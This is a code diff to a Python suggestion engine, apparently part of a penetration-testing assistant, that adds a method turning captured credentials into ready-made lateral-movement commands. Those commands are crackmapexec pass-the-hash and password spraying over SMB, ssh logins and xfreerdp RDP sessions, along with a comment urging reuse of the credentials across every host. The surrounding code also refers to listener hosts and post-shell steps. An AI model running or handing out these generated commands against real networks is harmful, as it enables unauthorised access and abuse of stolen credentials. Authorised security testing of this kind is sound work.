@@ -41,11 +41,42 @@ class SuggestionEngine:
         out: list[Suggestion] = []
         out += self._from_chains(state, lhost, lport)
         out += self._from_findings(state)
+        out += self._from_lateral(state)
         for host in state.hosts.values():
             for svc in host.services.values():
                 out += self._from_service(host.address, svc, lhost, lport)
         out.append(self._post_shell(lhost))
         out.sort(key=lambda s: s.priority)
+        return out
+
+    def _from_lateral(self, state: EngagementState) -> list[Suggestion]:
+        """Credentials are gold: suggest reusing them across hosts and services."""
+        usable = [c for c in state.credentials
+                  if c.username and (c.secret or c.kind in ("hash", "key"))]
+        if not usable:
+            return []
+        hosts = list(state.hosts)
+        target = hosts[0] if hosts else "<target>"
+        ports = {s.port for h in state.hosts.values() for s in h.services.values()}
+        out = []
+        for cred in usable[:3]:
+            secret = cred.secret or "<secret>"
+            user = cred.username
+            if cred.kind == "hash":
+                actions = [f"crackmapexec smb {target} -u {user} -H {secret}   # pass-the-hash"]
+            else:
+                actions = [f"crackmapexec smb {target} -u {user} -p '{secret}'   # validate/spray"]
+            if 22 in ports:
+                actions.append(f"ssh {cred.username}@{target}")
+            if 3389 in ports:
+                actions.append(f"xfreerdp /v:{target} /u:{cred.username} /p:'{secret}' +clipboard")
+            if len(hosts) > 1:
+                actions.append(f"# reuse across all {len(hosts)} hosts (password reuse is common)")
+            out.append(Suggestion(
+                priority=2, title=f"Lateral movement with {cred.username}",
+                why=f"captured {cred.kind} credential — reuse across hosts/services",
+                actions=actions,
+            ))
         return out
 
     # --- rules --------------------------------------------------------------
